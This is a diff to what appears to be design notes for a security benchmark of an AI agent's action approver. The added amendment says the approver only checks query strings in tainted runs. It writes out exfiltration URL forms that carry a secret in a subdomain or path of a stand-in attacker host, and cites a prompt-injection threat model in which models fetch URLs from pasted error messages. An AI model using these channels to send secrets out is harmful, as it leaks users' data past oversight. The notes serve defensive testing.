@@ -40,6 +40,12 @@ exfil fix look like a property of the approver, which it is not.
   "trade a refusal for a timeout" the old comment warned about, reproduced inside the suite.
 - **A tainted fetch with a query string is a REVIEW** (`assess_action`). The leak the 2026-08-14 run
   named and left open — `http_get ?data=SECRET` — is closed, and its cost is on the table below.
+  *[Amended 2026-10-04, study 30 S30-21(f): "closed" covers that row and nothing wider. Only the
+  QUERY STRING is read, and only in a tainted run. A secret carried in the subdomain
+  (`SECRET.attacker.test`) or the path (`attacker.test/SECRET/`) is an ALLOW, and so is every variant
+  in a clean run — which is the threat model of arXiv 2610.01768, where the user pastes an error
+  message carrying the URL and 11 open models fetched it 79.7% of the time. No row here exercises
+  either; adding them, with their false-REVIEW cost, is open. The row and its number stand.]*
 - **`edit_batch` is a write tool** in both sets. Asserted by tests, not by the bench.
 
 ## The arms
